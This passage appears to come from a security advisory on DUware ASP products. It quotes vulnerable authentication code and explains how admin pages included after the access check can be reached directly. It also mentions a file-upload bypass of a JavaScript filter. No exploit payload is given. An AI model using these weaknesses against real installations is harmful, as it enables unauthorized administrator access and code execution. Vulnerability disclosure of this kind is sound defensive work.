2. DETAILS
======================================================================

- Admin Access :

A vulnerability has been discovered in DUWARE Products, which allows
malicious users to become administrators

This vulnerability affect all products of DUware. 
For example we use the DUcalendar product and its /admin/edit.asp file. 

Here the vulnerable code :

----------------------------------------------------
<% Response.Buffer = True %>
<html>
<head>
<title>DUcalendar 1.0</title>
<link href="../assets/DUcalendar.css" rel="stylesheet" type="text/css">
</head>
<body background="../assets/bg_main.gif" >
<table width="760" border="0" cellspacing="2" cellpadding="0">
<tr>
<td>
<!--#include file="inc_header.asp" -->
</td>
</tr>

<tr>
<td>
<table width="100%" border="0" cellpadding="0" cellspacing="1" 
bgcolor="#003399">
<tr>
<td bgcolor="#FFFFFF">


<!--#include file="inc_menu.asp" -->
<!--#include file="inc_edit.asp" -->


</td>
</tr>
</table></td>
</tr>
<tr>
<td>
<!--#include file="inc_footer.asp" -->
</td>
</tr>
</table>
</body>
</html>
----------------------------------------------------

We can see that files inc_menu.asp and inc_edit.asp are included.

The file inc_menu.asp contains the security code preventing 
the access to the edit.asp file :

Here the vulnerable code :

----------------------------------------------------
[...]
<%
' *** Restrict Access To Page: Grant or deny access to this page
MM_authorizedUsers=""
MM_authFailedURL="default.asp"
MM_grantAccess=false
If Session("MM_Username") <> "" Then
If (true Or CStr(Session("MM_UserAuthorization"))="") Or _
(InStr(1,MM_authorizedUsers,Session("MM_UserAuthorization"))>=1) 
Then
MM_grantAccess = true
End If
End If
If Not MM_grantAccess Then
MM_qsChar = "?"
If (InStr(1,MM_authFailedURL,"?") >= 1) Then MM_qsChar = "&"
MM_referrer = Request.ServerVariables("URL")
if (Len(Request.QueryString()) > 0) Then MM_referrer = MM_referrer & "?" & 
Request.QueryString()
MM_authFailedURL = MM_authFailedURL & MM_qsChar & "accessdenied=" & 
Server.URLEncode(MM_referrer)
Response.Redirect(MM_authFailedURL)
End If
%>
[...]
----------------------------------------------------

This code of security is present in all the applications of DUware.

The problem is essentially due to 3 elements:
- All the administrator's code is in the file
- A file is includes allowing the connection to the data base:
<!--#include file="../Connections/connDUcalendarAdmin.asp" -->
- No check of the administrator's rights is made in this file.
(Given that it was already made in the edit.asp file)


- Arbitrary File Upload :

A vulnerability has been identified in DUpics allowing malicious users to
upload and execute arbitrary code by bypassing javascript filter.
